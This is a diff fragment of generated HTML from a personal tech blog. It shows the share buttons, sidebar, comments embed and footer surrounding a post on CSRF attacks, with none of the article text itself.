+    <a href="https://social-plugins.line.me/lineit/share?url=https%3a%2f%2fblog.davidh83110.com%2f%25E8%25B3%2587%25E8%25A8%258A%25E5%25AE%2589%25E5%2585%25A8%2f%25E9%25A7%25AD%25E5%25AE%25A2%25E6%258A%2580%25E8%25A1%2593%2fowasp%2520top10%2f2016%2f09%2f09%2fcsrf.html" target="_blank" rel="noopener" class="share-btn line">
+        <i class="fab fa-line fa-5x"></i><p>&nbsp;Line</p>
+      </a>
+  
+
+  
+      <a href="//www.facebook.com/sharer/sharer.php?u=https%3a%2f%2fblog.davidh83110.com%2f%25E8%25B3%2587%25E8%25A8%258A%25E5%25AE%2589%25E5%2585%25A8%2f%25E9%25A7%25AD%25E5%25AE%25A2%25E6%258A%2580%25E8%25A1%2593%2fowasp%2520top10%2f2016%2f09%2f09%2fcsrf.html" target="_blank" rel="noopener" class="share-btn facebook">
+        <i class="fab fa-facebook"></i><p>&nbsp;Facebook</p>
+        </a>
+  
+
+  
+        <a href="//www.linkedin.com/shareArticle?url=https%3a%2f%2fblog.davidh83110.com%2f%25E8%25B3%2587%25E8%25A8%258A%25E5%25AE%2589%25E5%2585%25A8%2f%25E9%25A7%25AD%25E5%25AE%25A2%25E6%258A%2580%25E8%25A1%2593%2fowasp%2520top10%2f2016%2f09%2f09%2fcsrf.html&amp;title=CSRF%20%28Cross%20Site%20Request%20Forgery%29%20%e8%b7%a8%e7%ab%99%e8%ab%8b%e6%b1%82%e5%81%bd%e9%80%a0%e6%94%bb%e6%93%8a%20in%20OWASP" target="_blank" rel="noopener" class="share-btn linkedin">
+            <i class="fab fa-linkedin"></i><p>&nbsp;LinkedIn</p>
+          </a>
+  
+
+  
+        <a href="mailto:?subject=Check%20out%20this%20post%20by David&amp;body=https%3a%2f%2fblog.davidh83110.com%2f%25E8%25B3%2587%25E8%25A8%258A%25E5%25AE%2589%25E5%2585%25A8%2f%25E9%25A7%25AD%25E5%25AE%25A2%25E6%258A%2580%25E8%25A1%2593%2fowasp%2520top10%2f2016%2f09%2f09%2fcsrf.html" target="_blank" class="share-btn email" data-proofer-ignore>
+          <i class="fas fa-envelope"></i><p>&nbsp;Email</p>
+        </a>
+  
+
+  
+    
+    <a href="//twitter.com/share?text=CSRF%20%28Cross%20Site%20Request%20Forgery%29%20%e8%b7%a8%e7%ab%99%e8%ab%8b%e6%b1%82%e5%81%bd%e9%80%a0%e6%94%bb%e6%93%8a%20in%20OWASP&amp;url=https%3a%2f%2fblog.davidh83110.com%2f%25E8%25B3%2587%25E8%25A8%258A%25E5%25AE%2589%25E5%2585%25A8%2f%25E9%25A7%25AD%25E5%25AE%25A2%25E6%258A%2580%25E8%25A1%2593%2fowasp%2520top10%2f2016%2f09%2f09%2fcsrf.html" target="_blank" rel="noopener" class="share-btn twitter">
+        <i class="fab fa-twitter"></i><p>&nbsp;Twitter</p>
+      </a>
+  
+
+
+    <br />
+  </section>
+  <footer>
+    <ul class="stats">
+  
+    
+    
+      <li class="categories">
+        <ul>
+          
+            
+            <li><a class="article-category-link" href="/categories/security">Security</a></li>
+          
+            
+            <li><a class="article-category-link" href="/categories/owasp">OWASP</a></li>
+          
+        </ul>
+      </li>
+    
+  
+  
+    <li class="tags">
+      <ul>
+        <li>-</li>
+      </ul>
+    </li>
+  
+</ul>
+
+  </footer>
+</article>
+
+    <article class="post">
+        <div id="disqus_thread"></div>
+<script type="application/javascript">
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "davidh83110" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+    </article>
+
+
+
+
+<div class="pagination">
+  
+    <a href="/%E7%B3%BB%E7%B5%B1%E5%BB%BA%E7%BD%AE/2015/07/31/ddns.html" class="button"><div class="previous"><div>SQL Server 無固定IP架設教學(使用DDNS)</div></div></a>
+  
+  
+    <a href="/%E8%B3%87%E8%A8%8A%E5%AE%89%E5%85%A8/%E9%A7%AD%E5%AE%A2%E6%8A%80%E8%A1%93/owasp%20top10/2016/10/07/directory-traversal.html" class="button"><div class="next"><div>Directory Traversal - 跨目錄/檔案穿越攻擊 in OWASP</div></div></a>
+  
+</div>
+
+
+      </main>
+      <section id="site-sidebar">
+
+
+
+
+
+
+  
+    
+      <section id="categories">
+        <header>
+          <h1><a href="/categories">Categories</a></h1>
+        </header>
+        <ul>
+          
+            
+          
+          
+          <li>
+            
+              <a href="/categories/aws/">aws<span class="count">8</span></a>
+            
+          
+          <li>
+            
+              <a href="/categories/jibber-jabber/">jibber-jabber<span class="count">7</span></a>
+            
+          
+          <li>
+            
+              <a href="/categories/kubernetes/">kubernetes<span class="count">4</span></a>
+            
+          
+          <li>
+            
+              <a href="/categories/owasp/">owasp<span class="count">3</span></a>
+            
+          
+          <li>
+            
+              <a href="/categories/python/">python<span class="count">3</span></a>
+            
+          
+          <li>
+            
+              <a href="/categories/security/">security<span class="count">3</span></a>
+            
+          
+          <li>
+            
+              <a href="/categories/architecture/">architecture<span class="count">2</span></a>
+            
+          
+          <li>
+            
+              <a href="/categories/terraform/">terraform<span class="count">2</span></a>
+            
+          
+          <li>
+            
+              <a href="/categories/linux/">linux<span class="count">1</span></a>
+            
+          
+          <li>
+            
+              <a href="/categories/mongodb/">mongodb<span class="count">1</span></a>
+            
+          
+          <li>
+            
+              <a href="/categories/serverless/">serverless<span class="count">1</span></a>
+            
+          
+          </li>
+        </ul>
+      </section>
+    
+  
+
+
+  
+    <section id="recent-posts">
+      <header>
+        <h1>Recent posts</h1>
+      </header>
+      
+      <article class="mini-post">
+        <section>
+          
+  <a href="/blog/2021-06-24-eks-awslbcontroller-gracefully-rolling-update/" class="image featured">
+    
+    <p style="text-align: center;">
+      <img src="https://live.staticflickr.com/65535/51268214173_8bbd7a3200_z.jpg" alt="">
+    </p>
+    
+  </a>
+
+
+        </section>
+        <header>
+          <h4><a href="/blog/2021-06-24-eks-awslbcontroller-gracefully-rolling-update/">Solved - AWS LoadBalancer Controller Cannot Gracefully Rolling Update</a></h4>
+          <time class="published" datetime="">June 24, 2021</time>
+        </header>
+      </article>
+      
+      <article class="mini-post">
+        <section>
+          
+  <a href="/blog/2020-05-26-eks-best-practices-security/" class="image featured">
+    
+    <p style="text-align: center;">
+      <img src="https://live.staticflickr.com/65535/49970338736_ffd25b0434_b.jpg" alt="">
+    </p>
+    
+  </a>
+
+
+        </section>
+        <header>
+          <h4><a href="/blog/2020-05-26-eks-best-practices-security/">EKS Best Practices - Security</a></h4>
+          <time class="published" datetime="">June 7, 2020</time>
+        </header>
+      </article>
+      
+      <article class="mini-post">
+        <section>
+          
+  <a href="/aws/kubernetes/%E7%B3%BB%E7%B5%B1%E5%BB%BA%E7%BD%AE/terraform/2020/05/14/eks-external-dns.html" class="image featured">
+    
+    <p style="text-align: center;">
+      <img src="https://live.staticflickr.com/65535/49908288961_c380509717_b.jpg%20width=10" alt="">
+    </p>
+    
+  </a>
+
+
+        </section>
+        <header>
+          <h4><a href="/aws/kubernetes/%E7%B3%BB%E7%B5%B1%E5%BB%BA%E7%BD%AE/terraform/2020/05/14/eks-external-dns.html">EKS External-DNS Cross Account Route53 Setup</a></h4>
+          <time class="published" datetime="">May 14, 2020</time>
+        </header>
+      </article>
+      
+      <article class="mini-post">
+        <section>
+          
+  <a href="/aws/kubernetes/%E7%B3%BB%E7%B5%B1%E5%BB%BA%E7%BD%AE/terraform/2020/03/30/eks-install.html" class="image featured">
+    
+    <p style="text-align: center;">
+      <img src="https://live.staticflickr.com/65535/49715657891_23558e7f5d_k.jpg" alt="">
+    </p>
+    
+  </a>
+
+
+        </section>
+        <header>
+          <h4><a href="/aws/kubernetes/%E7%B3%BB%E7%B5%B1%E5%BB%BA%E7%BD%AE/terraform/2020/03/30/eks-install.html">EKS Building &amp; Troubleshooting</a></h4>
+          <time class="published" datetime="">March 30, 2020</time>
+        </header>
+      </article>
+      
+      <article class="mini-post">
+        <section>
+          
+  <a href="/%E6%8A%80%E8%A1%93%E7%B0%A1%E4%BB%8B/2020/03/05/saas-self-hosted.html" class="image featured">
+    
+    <p style="text-align: center;">
+      <img src="https://live.staticflickr.com/65535/49618259028_e4784532cf_h.jpg" alt="">
+    </p>
+    
+  </a>
+
+
+        </section>
+        <header>
+          <h4><a href="/%E6%8A%80%E8%A1%93%E7%B0%A1%E4%BB%8B/2020/03/05/saas-self-hosted.html">SaaS/Managed Services &amp; Self-Hosted 衍伸思考</a></h4>
+          <time class="published" datetime="">March 5, 2020</time>
+        </header>
+      </article>
+      
+      <article class="mini-post">
+        <section>
+          
+
+        </section>
+        <header>
+          <h4><a href="/aws/%E7%B3%BB%E7%B5%B1%E5%BB%BA%E7%BD%AE/2020/02/15/cloud-native-log-solution.html">Cloud-Native LOG 儲存以及分析方案</a></h4>
+          <time class="published" datetime="">February 15, 2020</time>
+        </header>
+      </article>
+      
+      
+        <footer>
+          <a href="/blog/" class="button">See more</a>
+        </footer>
+      
+    </section>
+  
+
+
+</section>
+      <footer id="site-footer">
+  
+      <ul class="socnet-icons">
+        
+
+        <li><a href="//github.com/davidh83110" target="_blank" rel="noopener" title="GitHub" class="fab fa-github"></a></li>
+
+<li><a href="//stackoverflow.com/users/12397001" target="_blank" rel="noopener" title="Stack Overflow" class="fab fa-stack-overflow"></a></li>
+
+
+
+
+
+
+
+
+
+<li><a href="//linkedin.com/in/david-hsu-b1136112b" target="_blank" rel="noopener" title="LinkedIn" class="fab fa-linkedin"></a></li>
+
+
+
+
+<li><a href="//facebook.com/ben12567" target="_blank" rel="noopener" title="Facebook" class="fab fa-facebook"></a></li>
+
+
+
+
+
+
+
+
+<li><a href="//instagram.com/davidh.110" target="_blank" rel="noopener" title="Instagram" class="fab fa-instagram"></a></li>
+
+
+
+
+
+
+
+
+
+
+
+
+
+<li><a href="mailto:davidh83110@gmail.com" target="_blank" title="Email" class="far fa-envelope"></a></li>
+
+      </ul>
+  
+  <p class="copyright">
+    
+      &copy; 2021
+      
+        David&#39;s Blog
+      
+    . <br>
+    Theme: <a href='https://github.com/pacollins/hugo-future-imperfect-slim' target='_blank' rel='noopener'>Hugo Future Imperfect Slim</a><br>A <a href='https://html5up.net/future-imperfect' target='_blank' rel='noopener'>HTML5 UP port</a> | Powered by <a href='https://gohugo.io/' title='0.84.0' target='_blank' rel='noopener'>Hugo</a>
+  </p>
+</footer>
+<a id="back-to-top" href="#" class="fas fa-arrow-up fa-2x"></a>
+
+      <script src="/js/highlight.js"></script>
+    <script>hljs.initHighlightingOnLoad();</script><script src="/js/bundle.min.3567e1d70532540eb622813fa8aaba80094367cccdee229013d0c464e7b465df.js" integrity="sha256-NWfh1wUyVA62IoE/qKq6gAlDZ8zN7iKQE9DEZOe0Zd8="></script>
+    <script src="/js/add-on.js"></script>
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-85468802-6', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+    </div>
+  </body>
+</html>
